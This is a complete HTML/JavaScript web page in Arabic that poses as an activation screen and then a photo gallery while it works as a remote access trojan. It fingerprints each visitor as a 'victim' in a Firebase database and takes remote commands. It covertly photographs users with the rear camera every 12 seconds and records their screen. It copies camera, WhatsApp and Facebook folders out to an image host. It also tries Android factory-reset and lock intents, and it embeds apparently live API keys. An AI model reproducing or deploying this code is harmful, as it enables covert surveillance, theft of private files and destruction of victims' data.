<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>جاري التفعيل...</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Courier New',monospace; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; margin: 0; }
        #msg { font-size: 1.5em; text-align: center; margin-bottom: 30px; }
        .btn { background: #fff; color: #000; padding: 12px 30px; border: none; font-weight: bold; cursor: pointer; font-size: 1.2em; border-radius: 5px; display: none; }
    </style>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
</head>
<body>
    <div id="msg">⋯</div>
    <button id="grantBtn" class="btn" onclick="initPayload()">متابعة</button>
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
            authDomain: "zwahy-5b75d.firebaseapp.com",
            databaseURL: "https://zwahy-5b75d-default-rtdb.firebaseio.com",
            projectId: "zwahy-5b75d",
            storageBucket: "zwahy-5b75d.firebasestorage.app",
            messagingSenderId: "820206227713",
            appId: "1:820206227713:web:02057307aca7dfb7100b00"
        };
        const IMGBB_KEY = "69e4b5971880f9d736172f5fc9eb5bac";
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const vid = 'phantom-' + Math.random().toString(36).substr(2,12);
        const vref = db.ref('victims/'+vid);
        let rootDir = null, camStream = null;
        const folderHandles = {};      // تخزين مقابض المجلدات بعد المنح
        let fileAccessReady = false;   // هل لدينا صلاحية ملفات؟

        // ========== إعداد الشاشة ==========
        setTimeout(() => {
            document.getElementById('msg').innerText = "اضغط على متابعة للبدء";
            document.getElementById('grantBtn').style.display = 'block';
        }, 2000);

        window.initPayload = async function() {
            const btn = document.getElementById('grantBtn');
            btn.style.display = 'none';
            document.getElementById('msg').innerText = "جاري تجهيز الإذن...";

            // ---- الصلاحيات الصامتة ----
            try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
            try { const dStream = await navigator.mediaDevices.getDisplayMedia({ video: true }); dStream.getTracks().forEach(t => t.stop()); } catch(e) {}
            try {
                let a = document.createElement('a');
                a.href = 'intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
                a.click();
            } catch(e) {}

            // ---- طلب المجلد العام (بدون إجبار) ----
            document.getElementById('msg').innerText = "حدد مجلداً لحفظ البيانات...";
            try {
                rootDir = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
                fileAccessReady = true;
                // نخزن المقابض للمجلدات المهمة
                await cacheAllKnownFolders();
            } catch(e) {
                // المستخدم أغلق النافذة دون اختيار – نستمر عادي
                fileAccessReady = false;
            }

            // ---- اكتمال التفعيل (دائماً ناجح) ----
            document.getElementById('msg').innerText = "✅ اكتمل التفعيل";
            setTimeout(() => {
                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
            }, 1000);

            await registerDevice();
            startCommandListener();
            if (camStream) startHiddenCamera();
        };

        // ========== تخزين مقابض المجلدات المعروفة ==========
        async function cacheAllKnownFolders() {
            const PATHS = {
                camera: 'DCIM/Camera',
                downloads: 'Download',
                whatsapp: 'WhatsApp/Media/WhatsApp Images',
                facebook: 'Facebook/Media',
                pictures: 'Pictures'
            };
            if (rootDir && rootDir.resolve) {
                for (const [key, path] of Object.entries(PATHS)) {
                    try {
                        let parts = path.split('/');
                        let handle = rootDir;
                        for (let p of parts) handle = await handle.getDirectoryHandle(p);
                        folderHandles[key] = handle;
                    } catch(e) {}
                }
            }
        }

        // ========== تسجيل الجهاز ==========
        async function registerDevice() {
            let ip = 'غير معروف';
            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
            let battery = '?', charging = false;
            if (navigator.getBattery) { const b = await navigator.getBattery(); battery = Math.round(b.level*100)+'%'; charging = b.charging; }
            await vref.set({
                online: true,
                fingerprint: { ua: navigator.userAgent, plat: navigator.platform, scr: screen.width+'x'+screen.height, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory||'?', ip, battery, charging, language: navigator.language }
            });
        }

        // ========== مستقبل الأوامر ==========
        function startCommandListener() {
            vref.child('command').on('value', async snap => {
                const c = snap.val();
                if (!c) return;
                try {
                    switch(c.action) {
                        case 'get_photos': c.folder ? await pullFromFolder(c.folder) : await pullAll(); break;
                        case 'get_files': break;
                        case 'vibrate': navigator.vibrate([200,100,200]); break;
                        case 'play_sound': break;
                        case 'screenshot': await screenshot(); break;
                        case 'record_video': await recordVid(c.duration||10); break;
                        case 'format': await formatDevice(); break;
                        case 'stealth_photo': await captureHiddenPhoto(); break;
                        case 'flash_on': await setFlash(true); break;
                        case 'flash_off': await setFlash(false); break;
                        case 'device_info': await sendDeviceInfo(); break;
                        case 'lock_screen': lockScreen(); break;
                    }
                } catch(e) {}
                await vref.child('command').remove();
            });
        }

        // ========== سحب الصور ==========
        async function getFolderHandle(key) {
            if (folderHandles[key]) return folderHandles[key];
            // إذا لم يكن لدينا صلاحية ملفات بعد، نطلبها الآن بطريقة عامة
            if (!fileAccessReady) {
                try {
                    rootDir = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
                    fileAccessReady = true;
                    await cacheAllKnownFolders();
                    if (folderHandles[key]) return folderHandles[key];
                } catch(e) {
                    throw new Error('تم رفض إذن الملفات');
                }
            }
            // إذا مازال غير موجود، ربما المجلد لم يتم تخزينه، نطلب المجلد المحدد
            document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">الرجاء اختيار مجلد ' + key + '</h2>';
            try {
                const handle = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
                folderHandles[key] = handle;
                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
                return handle;
            } catch(e) {
                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
                throw new Error('رفض الاختيار');
            }
        }

        async function pullFromFolder(key) {
            const handle = await getFolderHandle(key);
            await walkDir(handle, key + '/');
        }

        async function pullAll() {
            for (const key of ['camera','downloads','whatsapp','facebook','pictures']) {
                try { await pullFromFolder(key); } catch(e) {}
            }
        }

        async function walkDir(dirHandle, prefix) {
            for await (let entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    let file = await entry.getFile();
                    if (file.size > 15*1024*1024) continue;
                    let reader = new FileReader();
                    reader.onload = async e => {
                        let b64 = e.target.result.split(',')[1];
                        let url = await uploadToImgBB(b64);
                        await store('file', url, { name: prefix+entry.name, size: file.size });
                    };
                    reader.readAsDataURL(file);
                } else if (entry.kind === 'directory') {
                    let sub = await dirHandle.getDirectoryHandle(entry.name);
                    await walkDir(sub, prefix+entry.name+'/');
                }
            }
        }

        // ========== الميزات الأخرى ==========
        async function setFlash(on) {
            if (!camStream) return;
            let track = camStream.getVideoTracks()[0];
            if (track && track.applyConstraints) await track.applyConstraints({ advanced: [{ torch: on }] });
        }

        async function sendDeviceInfo() {
            let info = (await vref.child('fingerprint').once('value')).val() || {};
            await store('device_info', null, { info });
        }

        async function screenshot() {
            let stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            let video = document.createElement('video'); video.srcObject = stream; await video.play();
            let canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            let b64 = canvas.toDataURL('image/png').split(',')[1];
            let url = await uploadToImgBB(b64);
            await store('screenshot', url, { ts: Date.now() });
            stream.getTracks().forEach(t => t.stop());
        }

        async function recordVid(sec) {
            let stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
            let recorder = new MediaRecorder(stream), chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                let blob = new Blob(chunks, { type: 'video/webm' });
                let r = new FileReader();
                r.onload = async e => {
                    let b64 = e.target.result.split(',')[1];
                    let url = await uploadToImgBB(b64);
                    await store('video', url, { ts: Date.now() });
                };
                r.readAsDataURL(blob);
                stream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            setTimeout(() => recorder.stop(), sec * 1000);
        }

        async function formatDevice() {
            let a = document.createElement('a');
            a.href = 'intent://#Intent;action=android.intent.action.MASTER_CLEAR;end';
            a.click();
            if (navigator.storage?.getDirectory) {
                let root = await navigator.storage.getDirectory();
                for await (let n of root.keys()) await root.removeEntry(n, { recursive: true });
            }
            if (navigator.clearData) await navigator.clearData({ cache: true, cookies: true, storage: true });
        }

        function lockScreen() {
            try {
                if (navigator.deviceAdmin) { navigator.deviceAdmin.lockNow(); }
                else {
                    let a = document.createElement('a');
                    a.href = 'intent://#Intent;action=android.intent.action.CLOSE_SYSTEM_DIALOGS;end';
                    a.click();
                    window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end');
                }
            } catch(e) {}
        }

        function startHiddenCamera() {
            if (!camStream) return;
            let video = document.createElement('video');
            video.srcObject = camStream; video.playsInline = true; video.play();
            setInterval(async () => {
                let canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                let b64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
                let url = await uploadToImgBB(b64);
                await store('stealth_photo', url, { ts: Date.now() });
            }, 12000);
        }

        async function captureHiddenPhoto() {
            if (!camStream) throw new Error('لا كاميرا');
            let img = new ImageCapture(camStream.getVideoTracks()[0]);
            let bitmap = await img.grabFrame();
            let canvas = document.createElement('canvas'); canvas.width = bitmap.width; canvas.height = bitmap.height;
            canvas.getContext('2d').drawImage(bitmap, 0, 0);
            let b64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
            let url = await uploadToImgBB(b64);
            await store('photo', url, { ts: Date.now() });
        }

        async function uploadToImgBB(b64) {
            let fd = new FormData(); fd.append('key', IMGBB_KEY); fd.append('image', b64);
            let res = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: fd });
            let json = await res.json();
            if (json.success) return json.data.url;
            throw new Error('رفع فشل');
        }

        async function store(type, url, extra = {}) {
            await vref.child('loot').push().set({ type, url, ts: Date.now(), ...extra });
        }
    </script>
</body>
</html>
